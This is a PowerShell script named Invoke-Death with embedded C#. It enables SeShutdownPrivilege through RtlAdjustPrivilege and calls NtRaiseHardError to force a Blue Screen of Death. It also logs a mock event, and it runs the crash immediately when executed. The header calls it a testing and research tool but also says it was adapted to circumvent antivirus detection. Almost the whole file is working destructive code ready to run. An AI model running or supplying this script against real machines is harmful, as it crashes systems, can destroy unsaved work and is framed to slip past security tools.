<#
.SYNOPSIS
    Invoke-Death triggers a Blue Screen of Death (BSOD) on a Windows machine 
    by invoking a hard error using native Windows functions.

.DESCRIPTION
    This PowerShell script contains embedded C# code that uses interop calls to the `ntdll.dll` library. It:
    1. Adjusts privileges to enable `SeShutdownPrivilege`.
    2. Invokes the `NtRaiseHardError` function to trigger a critical system error, leading to a BSOD.

    This script is intended for testing or research purposes in controlled environments only.
    🕷️ With great power comes great responsibility. Use it wisely.

.NOTES
    Author: SAN
    Date: 19.12.24
    Original concept by peewpw (https://github.com/peewpw/Invoke-BSOD).
    Adapted for circumventing AV detection and more controled execution.
    #public

.CHANGELOG


#>


$eventSource = "InvokeDeathScript"
$eventLog = "Application"

# Check if the event source exists; if not, create it
if (-not [System.Diagnostics.EventLog]::SourceExists($eventSource)) {
    [System.Diagnostics.EventLog]::CreateEventSource($eventSource, $eventLog)
}

function Invoke-Death {
    $source = @"
using System;
using System.Runtime.InteropServices;

public static class CS {
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

    public static void InvokeDeath() {
        bool previousValue;
        uint response;

        RtlAdjustPrivilege(19, true, false, out previousValue);

        string errorMessage = "Oppenheimer special: Fatal system error occurred!";
        IntPtr errorMessagePtr = Marshal.StringToHGlobalUni(errorMessage);

        NtRaiseHardError(0xc0000420, 1, 0, errorMessagePtr, 6, out response);

        Marshal.FreeHGlobal(errorMessagePtr);
    }
}

"@

    # Compile the C# code
    $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
    $compilerParameters.CompilerOptions = '/unsafe'
    $compiledType = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $compilerParameters

    # Call the method
    [CS]::InvokeDeath()
}



Write-EventLog -LogName $eventLog -Source $eventSource -EventId 1 -EntryType Error -Message "Now I am become Death, the destroyer of worlds."


Invoke-Death
